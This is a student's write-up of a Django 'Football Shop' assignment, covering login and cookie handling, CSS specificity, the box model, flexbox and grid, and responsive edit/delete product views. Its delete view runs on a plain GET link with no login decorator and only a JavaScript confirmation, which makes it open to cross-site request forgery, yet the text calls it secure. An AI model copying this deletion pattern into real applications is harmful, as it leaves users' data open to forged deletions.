    if form.is_valid() and request.method == "POST":
        football_item_entry = form.save(commit=False)
        football_item_entry.user = request.user  # Associate with current user
        football_item_entry.save()
        return redirect('main:show_main')

    context = {'form': form}
    return render(request, "create_football_item.html", context)
```

**Key Implementation Details:**
- Added `@login_required` decorator to protect views
- Used `commit=False` to modify object before saving
- Set `football_item_entry.user = request.user` to associate with current user

### **✅ 4. Showing User Information and Last Login Cookie**

#### **Step 4.1: Updated Main View Context**

**Modified context in `show_main` view:**
```python
context = {
    'npm' : '2406453556',
    'name': request.user.username,  # Dynamic username
    'class': 'KKI',
    'football_items': football_items,
    'last_login': request.COOKIES.get('last_login', 'Never'),  # Cookie data
}
```

#### **Step 4.2: Template Updates**

**Updated `main/templates/main.html` to display user info:**
```html
<div class="user-info">
    <h2>Welcome, {{ name }}!</h2>
    <p><strong>NPM:</strong> {{ npm }}</p>
    <p><strong>Class:</strong> {{ class }}</p>
    <p><strong>Last Login:</strong> {{ last_login }}</p>
</div>

<!-- Logout button -->
<a href="{% url 'main:logout' %}">
    <button>Logout</button>
</a>
```

#### **Step 4.3: Cookie Implementation**

**Login function sets cookie:**
```python
def login_user(request):
    if request.method == "POST":
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            response = HttpResponseRedirect(reverse("main:show_main"))
            response.set_cookie('last_login', str(datetime.datetime.now()))
            return response
    # ... rest of function
```

**Logout function deletes cookie:**
```python
def logout_user(request):
    logout(request)
    response = HttpResponseRedirect(reverse("main:show_main"))
    response.delete_cookie('last_login')
    return response
```

### **🔧 Implementation Challenges and Solutions**

#### **Challenge 1: Database Migration with Existing Data**
- **Problem**: Adding user field to existing FootballItem records
- **Solution**: Used `null=True` in model field to handle existing data gracefully

#### **Challenge 2: Template Inheritance Error**
- **Problem**: `login.html` tried to extend non-existent `base.html`
- **Solution**: Created `base.html` template with proper structure and styling

#### **Challenge 3: Missing Return Statement**
- **Problem**: Register view didn't return HttpResponse for GET requests
- **Solution**: Restructured view to have single return statement at the end

#### **Challenge 4: User Association**
- **Problem**: New items weren't automatically associated with logged-in user
- **Solution**: Used `commit=False` and manually set `user` field before saving

### **📋 Testing Verification**

1. **✅ Registration**: Successfully creates new user accounts
2. **✅ Login**: Authenticates users and sets last_login cookie
3. **✅ Logout**: Clears session and deletes cookie
4. **✅ User Association**: New items belong to logged-in user
5. **✅ Data Filtering**: Users only see their own items (when filtered)
6. **✅ Cookie Display**: Last login time shows on main page
7. **✅ Access Control**: Login required for creating items

This implementation provides a complete authentication system with proper user-data association and cookie management.

---

## Assignment 5

### **CSS Selector Priority: Multiple CSS Selectors Targeting HTML Elements**

When multiple CSS selectors target the same HTML element, CSS follows a specific priority order called **CSS Specificity**. The browser determines which styles to apply based on this hierarchy:

#### **📊 CSS Specificity Calculation**

CSS specificity is calculated using a four-part value: **(a, b, c, d)**

1. **Inline Styles (a)**: `style=""` attribute = 1000 points
2. **IDs (b)**: `#id` = 100 points each
3. **Classes/Attributes/Pseudo-classes (c)**: `.class`, `[attr]`, `:hover` = 10 points each
4. **Elements/Pseudo-elements (d)**: `div`, `p`, `::before` = 1 point each

#### **🏆 Priority Order (Highest to Lowest)**

```css
/* 1. Inline Styles - 1000 points */
<div style="color: red;">Highest Priority</div>

/* 2. IDs - 100 points */
#header { color: blue; }

/* 3. Classes, Attributes, Pseudo-classes - 10 points */
.navigation { color: green; }
[type="text"] { color: purple; }
a:hover { color: orange; }

/* 4. Elements - 1 point */
div { color: black; }
p { color: gray; }

/* 5. Universal Selector - 0 points */
* { color: yellow; }
```

#### **🔢 Specificity Examples**

```css
/* Specificity: (0, 1, 0, 1) = 101 points */
#navbar p { color: red; }

/* Specificity: (0, 0, 2, 1) = 21 points */
.header.active p { color: blue; }

/* Specificity: (0, 0, 1, 2) = 12 points */
div p.highlight { color: green; }

/* Specificity: (0, 0, 0, 2) = 2 points */
div p { color: purple; }
```

**Result**: The first rule wins because 101 > 21 > 12 > 2

#### **⚡ Special Cases**

1. **!important Declaration**: Overrides all other rules
```css
p { color: red !important; } /* Always wins regardless of specificity */
```

2. **Source Order**: When specificity is equal, the last rule wins
```css
.button { color: red; }
.button { color: blue; } /* This wins - same specificity, appears later */
```

3. **Inherited vs Direct Styles**: Direct styles always beat inherited ones
```css
/* HTML: <div class="parent"><p class="child">Text</p></div> */
.parent { color: red; }    /* Inherited */
p { color: blue; }         /* Direct - wins even with lower specificity */
```

---

### **Responsive Design in Web Application Development**

#### **🌐 Why is Responsive Design Important?**

Responsive design is crucial in modern web development because:

1. **Multi-Device World**: Users access websites from smartphones, tablets, laptops, desktops, smart TVs, and even smartwatches
2. **Mobile-First Era**: Over 60% of web traffic comes from mobile devices
3. **SEO Benefits**: Google prioritizes mobile-friendly websites in search rankings
4. **User Experience**: Ensures optimal viewing and interaction across all devices
5. **Cost Efficiency**: One website serves all devices instead of separate mobile/desktop versions
6. **Future-Proofing**: Adapts to new screen sizes and devices automatically

#### **📱 Examples of Applications**

##### **✅ EXCELLENT Responsive Design Examples:**

**1. GitHub**
- **Responsive Features**: 
  - Navigation collapses to hamburger menu on mobile
  - Code blocks scroll horizontally on small screens
  - Repository lists stack vertically on mobile
  - Touch-friendly buttons and links
- **Why It Works**: Maintains full functionality across all devices while optimizing layout for each screen size

**2. Shopify Admin Dashboard**
- **Responsive Features**:
  - Complex data tables become scrollable cards on mobile
  - Sidebar navigation transforms into bottom tabs
  - Charts and graphs resize and reformat for mobile viewing
  - Touch gestures for mobile interactions
- **Why It Works**: Transforms complex desktop interfaces into mobile-friendly experiences without losing functionality

**3. Airbnb**
- **Responsive Features**:
  - Image galleries adapt to screen size
  - Search filters reorganize for mobile
  - Maps resize and offer mobile-optimized interactions
  - Booking forms stack vertically on small screens
- **Why It Works**: Provides seamless booking experience across all devices with device-specific optimizations

##### **❌ POOR Responsive Design Examples:**

**1. Many Government Websites (e.g., older municipal sites)**
- **Problems**:
  - Fixed-width layouts that require horizontal scrolling on mobile
  - Tiny text that's impossible to read without zooming
  - Buttons too small for touch interaction
  - PDF-heavy content that doesn't display well on mobile
- **Impact**: Citizens can't access important services on mobile devices

**2. Legacy Banking Websites**
- **Problems**:
  - Tables with many columns that break on mobile
  - Complex forms that don't stack properly
  - Fixed navigation that takes up too much mobile screen space
  - Touch targets too small for fingers
- **Impact**: Users can't perform banking tasks on mobile, forcing them to use desktop or visit branches

**3. Older E-commerce Sites**
- **Problems**:
  - Product images don't resize properly
  - Checkout processes break on mobile
  - Search functionality doesn't work well on touch devices
  - Cart and wishlist features are unusable on mobile
- **Impact**: Lost sales and frustrated customers who abandon purchases

#### **🔍 Reasons Behind These Examples**

##### **Why Good Examples Succeed:**
1. **Mobile-First Approach**: Designed for mobile first, then enhanced for larger screens
2. **Progressive Enhancement**: Core functionality works everywhere, enhanced features added for capable devices
3. **Touch-Friendly Design**: Buttons, links, and interactive elements sized for fingers
4. **Content Prioritization**: Most important content shown first on small screens
5. **Performance Optimization**: Fast loading on slower mobile connections

##### **Why Poor Examples Fail:**
1. **Desktop-First Mentality**: Designed for desktop, then poorly adapted for mobile
2. **Fixed-Width Layouts**: Don't adapt to different screen sizes
3. **Neglected Touch Interactions**: Designed only for mouse/keyboard input
4. **Content Overcrowding**: Try to fit too much information on small screens
5. **Legacy Technology**: Built with outdated techniques that don't support responsive design

---

### **Box Model: Margin, Border, and Padding Differences**

The CSS Box Model defines how elements are structured and spaced. Every HTML element is essentially a rectangular box with four main components:

#### **📦 Box Model Components**

```
┌─────────────── MARGIN ───────────────┐
│  ┌─────────── BORDER ─────────────┐  │
│  │  ┌─────── PADDING ───────────┐ │  │
│  │  │                           │ │  │
│  │  │        CONTENT            │ │  │
│  │  │                           │ │  │
│  │  └───────────────────────────┘ │  │
│  └─────────────────────────────────┘  │
└───────────────────────────────────────┘
```

#### **🎯 Key Differences**

| Component | Purpose | Visibility | Affects Layout | Background Color |
|-----------|---------|------------|----------------|------------------|
| **Content** | Actual text/images | ✅ Visible | ✅ Yes | ✅ Shows |
| **Padding** | Space inside element | ❌ Transparent | ✅ Yes | ✅ Shows element's background |
| **Border** | Element boundary | ✅ Visible (if styled) | ✅ Yes | ✅ Has own color/style |
| **Margin** | Space outside element | ❌ Transparent | ✅ Yes | ❌ No background |

#### **💻 Implementation Examples**

##### **1. Basic Box Model Implementation**
```css
.box {
    /* Content area */
    width: 200px;
    height: 100px;
    
    /* Padding - space inside the element */
    padding: 20px;                    /* All sides */
    padding: 10px 20px;              /* Vertical | Horizontal */
    padding: 10px 15px 20px 25px;    /* Top | Right | Bottom | Left */
    
    /* Border - element boundary */
    border: 2px solid #333;          /* Width | Style | Color */
    border-width: 1px 2px 3px 4px;   /* Individual widths */
    border-style: solid dashed dotted double; /* Individual styles */
    border-color: red green blue yellow;      /* Individual colors */
    
    /* Margin - space outside the element */
    margin: 15px;                    /* All sides */
    margin: 10px auto;               /* Vertical | Horizontal (auto centers) */
    margin: 5px 10px 15px 20px;      /* Top | Right | Bottom | Left */
}
```

##### **2. Practical Football Shop Example**
```css
/* Product card from our Football Shop */
.product-card {
    /* Content dimensions */
    width: 280px;
    height: auto;
    
    /* Padding - breathing room inside the card */
    padding: 20px;              /* Space between border and content */
    
    /* Border - card boundary with glassmorphism effect */
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 12px;        /* Rounded corners */
    
    /* Margin - space between cards */
    margin: 15px;               /* Space between adjacent cards */
    margin-bottom: 30px;        /* Extra space below each card */
    
    /* Background shows in content and padding areas */
    background: rgba(255, 255, 255, 0.05);
}

/* Navigation button example */
.nav-button {
    /* Content */
    width: auto;                /* Fits content */
    
    /* Padding - makes button clickable area larger */
    padding: 12px 24px;         /* Vertical | Horizontal */
    
    /* Border - button outline */
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 10px;
    
    /* Margin - space between buttons */
    margin-right: 10px;         /* Space to the right of each button */
    
    /* Background color shows in content and padding */
    background: rgba(255, 255, 255, 0.1);
}
```

##### **3. Box-Sizing Property**
```css
/* Default behavior: width/height applies only to content */
.content-box {
    box-sizing: content-box;    /* Default */
    width: 200px;               /* Content width only */
    padding: 20px;              /* Adds to total width */
    border: 2px solid black;    /* Adds to total width */
    /* Total width = 200px + 40px + 4px = 244px */
}

/* Alternative: width/height includes padding and border */
.border-box {
    box-sizing: border-box;     /* More predictable */
    width: 200px;               /* Total width including padding/border */
    padding: 20px;              /* Included in width */
    border: 2px solid black;    /* Included in width */
    /* Total width = 200px (content adjusts automatically) */
}

/* Global box-sizing reset (recommended) */
*, *::before, *::after {
    box-sizing: border-box;
}
```

##### **4. Margin Collapse Example**
```css
/* Vertical margins collapse between adjacent elements */
.section-1 {
    margin-bottom: 30px;        /* Bottom margin */
}

.section-2 {
    margin-top: 20px;           /* Top margin */
}
/* Actual space between sections: 30px (not 50px) - larger margin wins */

/* Prevent margin collapse with padding or border */
.no-collapse {
    padding-top: 1px;           /* Prevents collapse */
    /* or */
    border-top: 1px solid transparent;
}
```

#### **🚀 Practical Tips for Implementation**

1. **Use Border-Box Sizing**: Makes layout calculations easier
2. **Margin for Spacing**: Use margins to space elements apart
3. **Padding for Internal Space**: Use padding to create breathing room inside elements
4. **Border for Visual Boundaries**: Use borders to define element boundaries
5. **Consistent Spacing**: Use CSS variables for consistent spacing throughout your design

---

### **Layout Systems: Flexbox and Grid**

Modern CSS provides two powerful layout systems that revolutionized web design: **Flexbox** and **CSS Grid**. Each serves different purposes and excels in different scenarios.

#### **🔄 Flexbox (Flexible Box Layout)**

Flexbox is designed for **one-dimensional layouts** - either in a row or column direction.

##### **🎯 Core Concepts**
```css
/* Container (Parent) Properties */
.flex-container {
    display: flex;                    /* Enable flexbox */
    flex-direction: row;              /* row | column | row-reverse | column-reverse */
    flex-wrap: nowrap;                /* nowrap | wrap | wrap-reverse */
    justify-content: flex-start;      /* Main axis alignment */
    align-items: stretch;             /* Cross axis alignment */
    align-content: stretch;           /* Multi-line alignment */
    gap: 10px;                       /* Space between items */
}

/* Item (Child) Properties */
.flex-item {
    flex-grow: 0;                    /* Growth factor */
    flex-shrink: 1;                  /* Shrink factor */
    flex-basis: auto;                /* Initial size */
    flex: 1;                         /* Shorthand: grow shrink basis */
    align-self: auto;                /* Override parent's align-items */
    order: 0;                        /* Visual order (doesn't affect HTML) */
}
```

##### **📱 Flexbox Use Cases**

**1. Navigation Bar (from our Football Shop)**
```css
.navbar {
    display: flex;
    justify-content: space-between;   /* Logo left, menu right */
    align-items: center;              /* Vertically center everything */
    padding: 15px 30px;
    gap: 20px;
}

.navbar-nav {
    display: flex;
    gap: 15px;                       /* Space between nav items */
    align-items: center;
}

/* Responsive: stack on mobile */
@media (max-width: 768px) {
    .navbar {
        flex-direction: column;       /* Stack vertically */
        text-align: center;
    }
}
```

**2. Product Actions (Button Group)**
```css
.product-actions {
    display: flex;
    gap: 8px;                        /* Space between buttons */
    margin-top: 12px;
    flex-wrap: wrap;                 /* Wrap to next line if needed */
}

.btn-glass {
    flex: 0 0 auto;                  /* Don't grow or shrink */
}
```

**3. Form Layout**
```css
.form-row {
    display: flex;
    align-items: center;             /* Align label and input */
    gap: 10px;
    margin-bottom: 15px;
}

.form-row label {
    flex: 0 0 120px;                 /* Fixed width labels */
}

.form-row input {
    flex: 1;                         /* Input takes remaining space */
}
```

#### **🏗️ CSS Grid (Grid Layout)**

CSS Grid is designed for **two-dimensional layouts** - handling both rows and columns simultaneously.

##### **🎯 Core Concepts**
```css
/* Container (Parent) Properties */
.grid-container {
    display: grid;
    
    /* Define columns and rows */
    grid-template-columns: 1fr 2fr 1fr;        /* 3 columns with ratios */
    grid-template-rows: auto 1fr auto;         /* Header, content, footer */
    
    /* Shorthand for both */
    grid-template: 
        "header header header" auto
        "sidebar main aside" 1fr
        "footer footer footer" auto
        / 200px 1fr 200px;                     /* Column sizes */
    
    /* Gaps */
    gap: 20px;                                 /* Row and column gap */
    grid-gap: 10px 20px;                       /* Row gap | Column gap */
    
    /* Alignment */
    justify-items: stretch;                     /* Items in their grid areas */
    align-items: stretch;
    justify-content: center;                    /* Entire grid */
    align-content: center;
}

/* Item (Child) Properties */
.grid-item {
    /* Positioning */
    grid-column: 1 / 3;                        /* Start / End */
    grid-row: 2 / 4;
    
    /* Area naming */
    grid-area: header;                         /* Use named area */
    
    /* Alignment within grid area */
    justify-self: center;
    align-self: end;
}
```

##### **🏪 Grid Use Cases**

**1. Product Grid (from our Football Shop)**
```css
.products-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 24px;
    padding: 20px;
}

/* Responsive adjustments */
@media (max-width: 768px) {
    .products-grid {
        grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
        gap: 16px;
    }
}

@media (max-width: 480px) {
    .products-grid {
        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
        gap: 12px;
    }
}
```

**2. Dashboard Layout**
```css
.dashboard {
    display: grid;
    grid-template-areas:
        "header header header"
        "sidebar main aside"
        "footer footer footer";
    grid-template-rows: 60px 1fr 40px;
    grid-template-columns: 250px 1fr 200px;
    min-height: 100vh;
    gap: 20px;
}

.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.aside { grid-area: aside; }
.footer { grid-area: footer; }

/* Mobile: stack everything */
@media (max-width: 768px) {
    .dashboard {
        grid-template-areas:
            "header"
            "main"
            "sidebar"
            "aside"
            "footer";
        grid-template-columns: 1fr;
        grid-template-rows: auto;
    }
}
```

**3. Card Internal Layout**
```css
.product-card {
    display: grid;
    grid-template-rows: 200px 1fr auto;       /* Image, content, actions */
    height: 100%;
}

.product-image-container {
    grid-row: 1;                              /* First row */
}

.product-content {
    grid-row: 2;                              /* Second row - grows */
    padding: 16px;
}

.product-actions {
    grid-row: 3;                              /* Third row - fixed */
    padding: 0 16px 16px;
}
```

#### **🤔 When to Use Which?**

| Scenario | Use Flexbox | Use Grid |
|----------|-------------|----------|
| **Navigation bars** | ✅ Perfect | ❌ Overkill |
| **Button groups** | ✅ Perfect | ❌ Overkill |
| **Centering content** | ✅ Excellent | ✅ Also good |
| **Product catalogs** | ❌ Limited | ✅ Perfect |
| **Page layouts** | ❌ Difficult | ✅ Excellent |
| **Form layouts** | ✅ Good | ✅ Also good |
| **Responsive design** | ✅ Good | ✅ Excellent |

#### **🔄 Flexbox + Grid Together**
```css
/* Grid for overall page layout */
.page {
    display: grid;
    grid-template-areas:
        "header"
        "main"
        "footer";
}

/* Flexbox for header navigation */
.header {
    grid-area: header;
    display: flex;                    /* Flex inside grid */
    justify-content: space-between;
    align-items: center;
}

/* Grid for main content area */
.main {
    grid-area: main;
    display: grid;                    /* Grid inside grid */
    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
    gap: 20px;
}

/* Flexbox for card content */
.card {
    display: flex;                    /* Flex inside grid */
    flex-direction: column;
    justify-content: space-between;
}
```

This combination gives you the best of both worlds: Grid for complex layouts and Flexbox for simpler component arrangements.

---

### **Implementation Steps: Assignment Checklist Step-by-Step**

This section details how I implemented all the assignment requirements for creating an attractive, responsive Football Shop application.

#### **🎯 1. Core Functionality Implementation**

##### **Step 1.1: Delete Product Function**
```python
# main/views.py
def delete_football_item(request, id):
    # Get the item or return 404 if not found
    football_item = get_object_or_404(FootballItem, pk=id)
    
    # Security check: only item owner can delete
    if football_item.user != request.user:
        return HttpResponseForbidden("You don't have permission to delete this item.")
    
    # Delete the item
    football_item.delete()
    
    # Redirect back to main page
    return redirect('main:show_main')
```

**Key Implementation Details:**
- Used `get_object_or_404()` for automatic 404 handling
- Added security check to ensure only owners can delete their items
- Used `HttpResponseForbidden` for unauthorized access attempts
- Clean redirect after successful deletion

##### **Step 1.2: Edit Product Function**
```python
# main/views.py
@login_required(login_url='/login')
def edit_football_item(request, id):
    # Get the item or return 404
    football_item = get_object_or_404(FootballItem, pk=id)
    
    # Security check: only item owner can edit
    if football_item.user != request.user:
        return HttpResponseForbidden("You don't have permission to edit this item.")
    
    # Create form with existing data
    form = FootballItemForm(request.POST or None, instance=football_item)
    
    if form.is_valid() and request.method == "POST":
        form.save()  # Save changes
        return redirect('main:show_main')
    
    context = {'form': form, 'item': football_item}
    return render(request, 'edit_football_item.html', context)
```

**Key Implementation Details:**
- Pre-populated form with existing item data using `instance=football_item`
- Same security checks as delete function
- Used `@login_required` decorator for authentication
- Proper form validation before saving changes

##### **Step 1.3: URL Routing**
```python
# main/urls.py
urlpatterns = [
    # ... existing URLs ...
    path('edit_football_item/<int:id>/edit', edit_football_item, name='edit_football_item'),
    path('delete_football_item/<int:id>/delete', delete_football_item, name='delete_football_item'),
]
```

#### **🎨 2. Design Customization Implementation**

##### **Step 2.1: Glassmorphism Theme Development**

**Global CSS Framework (`static/css/global.css`):**
```css
/* Import modern font */
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap');

/* Global reset and base styles */
*, *:before, *:after {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}

/* Dark gradient background */
body.auth-page {
    background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 50%, #000000 100%);
    min-height: 100vh;
    font-family: 'Poppins', sans-serif;
}

/* Glassmorphism containers */
.auth-form {
    background-color: rgba(255,255,255,0.05);
    backdrop-filter: blur(16px);
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
    border-radius: 16px;
    padding: 50px 35px;
}
```

**Why This Approach:**
- **Modern Aesthetic**: Glassmorphism is trending and looks professional
- **Accessibility**: High contrast with white text on dark background
- **Performance**: CSS-only effects, no heavy images
- **Consistency**: Same theme across all pages

##### **Step 2.2: Login Page Enhancement**
```html
<!-- main/templates/login.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Football Shop</title>
    {% load static %}
    <link rel="stylesheet" type="text/css" href="{% static 'css/global.css' %}">
</head>
<body class="auth-page">
    <form method="POST" action="" class="auth-form login-form">
        {% csrf_token %}
        <h3>Login Here</h3>

        <!-- Enhanced error handling -->
        {% if messages %}
        <div class="messages">
            <ul>
                {% for message in messages %}
                <li>{{ message }}</li>
                {% endfor %}
            </ul>
        </div>
        {% endif %}

        <!-- Form fields with proper structure -->
        <div class="form-row">
            <label for="{{ form.username.id_for_label }}">Username</label>
            {{ form.username }}
            {% if form.username.errors %}
                <div class="field-errors">
                    {% for error in form.username.errors %}
                        {{ error }}
                    {% endfor %}
                </div>
            {% endif %}
        </div>

        <input type="submit" value="Log In">
        
        <div class="auth-nav-link">
            Don't have an account yet? <a href="{% url 'main:register' %}">Register Now</a>
        </div>
    </form>
</body>
</html>
```

**Enhanced Features:**
- Glassmorphism form container with blur effects
- Comprehensive error handling for all form fields
- Smooth animations and transitions
- Mobile-responsive design
- Proper semantic HTML structure

##### **Step 2.3: Product Card Design**
```css
/* Product card with glassmorphism */
.product-card {
    background: rgba(255, 255, 255, 0.05);
    backdrop-filter: blur(16px);
    border: 1px solid rgba(255, 255, 255, 0.1);
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
    border-radius: 12px;
    overflow: hidden;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    position: relative;
    display: flex;
    flex-direction: column;
}

/* Hover animations */
.product-card:hover {
    transform: translateY(-10px) scale(1.02);
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    background: rgba(255, 255, 255, 0.08);
}

/* Image container with overflow handling */
.product-image-container {
    position: relative;
    overflow: hidden;
    height: 192px;
}

.product-image {
    width: 100%;
    height: 100%;
    object-fit: cover;
    transition: transform 0.3s ease;
}

.product-card:hover .product-image {
    transform: scale(1.1);
}
```

#### **🔘 3. Product Cards with Edit/Delete Buttons**

##### **Step 3.1: Button Implementation**
```html
<!-- In main/templates/main.html -->
<div class="product-actions">
    <a href="{% url 'main:show_football_item_detail' item.id %}" class="btn-glass btn-small">
        View Details
    </a>
    {% if user.is_authenticated and item.user == user %}
        <a href="{% url 'main:edit_football_item' item.id %}" class="btn-glass btn-small">
            Edit
        </a>
        <a href="{% url 'main:delete_football_item' item.id %}" class="btn-glass btn-small" 
           onclick="return confirm('Are you sure you want to delete this item?')">
            Delete
        </a>
    {% endif %}
</div>
```

**Key Features:**
- **Conditional Display**: Edit/Delete buttons only show for item owners
- **Security**: Server-side validation ensures only owners can modify items
- **User Confirmation**: JavaScript confirmation for delete action
- **Consistent Styling**: All buttons use the same glassmorphism theme

##### **Step 3.2: Enhanced Button Animations**
```css
/* Enhanced button with microanimations */
.btn-glass {
    position: relative;
    overflow: hidden;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}

/* Shimmer effect */
.btn-glass::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
    transition: left 0.5s ease;
}

.btn-glass:hover::before {
    left: 100%;
}

/* Ripple effect on click */
.btn-glass::after {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    background: rgba(255, 255, 255, 0.3);
    border-radius: 50%;
    transform: translate(-50%, -50%);
    transition: width 0.6s, height 0.6s;
}

.btn-glass:active::after {
    width: 300px;
    height: 300px;
    transition: width 0s, height 0s;
}
```

#### **📱 4. Responsive Navigation Bar Implementation**

##### **Step 4.1: Mobile-First Navbar Structure**
```html
<!-- main/templates/navbar.html -->
<nav class="navbar">
    <div class="navbar-brand-section">
        <a href="/" class="navbar-brand">⚽ Football Shop</a>
    </div>
    
    <ul class="navbar-nav">
        <li><a href="/" class="nav-link">Home</a></li>
        <li><a href="{% url 'main:create_football_item' %}" class="nav-link primary">+ Add Item</a></li>
    </ul>
    
    <div class="navbar-user-info">
        {% if user.is_authenticated %}
            <div class="user-welcome">
                <span class="user-name">{{ name|default:user.username }}</span>
                <span class="user-details">{{ npm|default:"Student" }} - {{ class|default:"Class" }}</span>
            </div>
            <div class="navbar-actions">
                <a href="{% url 'main:logout' %}" class="nav-link">Logout</a>
            </div>
        {% else %}
            <div class="navbar-actions">
                <a href="{% url 'main:login' %}" class="nav-link">Login</a>
                <a href="{% url 'main:register' %}" class="nav-link primary">Register</a>
            </div>
        {% endif %}
    </div>
</nav>
```

##### **Step 4.2: Responsive CSS Implementation**
```css
/* Base navbar styles */
.navbar {
    background: rgba(255, 255, 255, 0.1);
    backdrop-filter: blur(16px);
    border: 1px solid rgba(255, 255, 255, 0.2);
    border-radius: 16px;
    padding: 15px 30px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 20px;
}

/* Mobile breakpoint - 768px */
@media (max-width: 768px) {
    .navbar {
        padding: 15px 20px;
        flex-direction: column;    /* Stack vertically */
        text-align: center;
        gap: 15px;
    }

    .navbar-brand {
        font-size: 1.5rem;        /* Smaller brand text */
    }

    .navbar-nav {
        justify-content: center;   /* Center navigation */
        gap: 10px;
    }

    .navbar-user-info {
        flex-direction: column;    /* Stack user info */
        text-align: center;
        gap: 10px;
    }
}

/* Small mobile breakpoint - 480px */
@media (max-width: 480px) {
    .navbar {
        padding: 12px 15px;
    }

    .navbar-nav {
        flex-direction: column;    /* Stack nav items */
        gap: 8px;
        width: 100%;
    }

    .nav-link {
        width: 100%;              /* Full-width buttons */
        text-align: center;
        padding: 10px;
    }

    .navbar-actions {
        flex-direction: column;
        width: 100%;
        gap: 8px;
    }
}
```

#### **🎭 5. Empty State and Error Handling**

##### **Step 5.1: No Products State**
```html
<!-- In main/templates/main.html -->
{% if not football_items %}
    <div class="empty-state">
        <h3>No Football Items Yet</h3>
        <p>Be the first to add a football item to the shop!</p>
    </div>
{% else %}
    <div class="products-grid">
        {% for item in football_items %}
            <!-- Product cards -->
        {% endfor %}
    </div>
{% endif %}
```

```css
/* Empty state with animation */
.empty-state {
    text-align: center;
    padding: 60px 20px;
    color: white;
    animation: bounceIn 1s ease-out forwards;
}

@keyframes bounceIn {
    0% {
        opacity: 0;
        transform: scale(0.3);
    }
    50% {
        opacity: 1;
        transform: scale(1.05);
    }
    100% {
        opacity: 1;
        transform: scale(1);
    }
}
```

#### **💰 6. Price Formatting Enhancement**

##### **Step 6.1: Adding Comma Separators**
```html
<!-- Updated price display -->
<div class="product-price">Rp {{ item.price|floatformat:0|intcomma }}</div>
```

**Implementation Steps:**
1. Added `{% load humanize %}` to template
2. Added `django.contrib.humanize` to `INSTALLED_APPS`
3. Used `|intcomma` filter for thousand separators
4. Result: 1000 → 1,000, 25000 → 25,000

#### **🎨 7. Microanimations Implementation**

##### **Step 7.1: Page Load Animations**
```css
/* Staggered product card animations */
.product-card {
    animation: fadeInUp 0.6s ease-out forwards;
}

.product-card:nth-child(1) { animation-delay: 0.1s; opacity: 0; }
.product-card:nth-child(2) { animation-delay: 0.2s; opacity: 0; }
.product-card:nth-child(3) { animation-delay: 0.3s; opacity: 0; }
.product-card:nth-child(4) { animation-delay: 0.4s; opacity: 0; }

@keyframes fadeInUp {
    from {
        opacity: 0;
        transform: translateY(30px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}
```

#### **🔧 8. Performance Optimizations**

##### **Step 8.1: Mobile Performance**
```css
/* Reduced animations on mobile */
@media (max-width: 768px) {
    .product-card:hover {
        transform: translateY(-5px) scale(1.01);  /* Less intensive */
    }
    
    .btn-glass:hover {
        transform: translateY(-2px);              /* Smaller movement */
    }
}
```

##### **Step 8.2: CSS Optimization**
```css
/* Hardware acceleration for smooth animations */
.product-card, .btn-glass {
    will-change: transform;
    transform: translateZ(0);  /* Force GPU acceleration */
}

/* Efficient transitions */
.btn-glass {
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);  /* Smooth easing */
}
```

### **📋 Final Implementation Summary**

✅ **Core Functionality**: Delete and edit functions with proper security
✅ **Attractive Design**: Glassmorphism theme across all pages  
✅ **Responsive Layout**: Mobile-first approach with breakpoints
✅ **Product Cards**: Edit/delete buttons with conditional display
✅ **Navigation**: Fully responsive navbar for mobile and desktop
✅ **Empty States**: Proper handling when no products exist
✅ **Microanimations**: Smooth transitions and hover effects
✅ **Performance**: Optimized animations for mobile devices
✅ **Security**: User authentication and authorization
✅ **User Experience**: Intuitive interface with visual feedback

The implementation follows modern web development best practices with a focus on user experience, performance, and maintainability.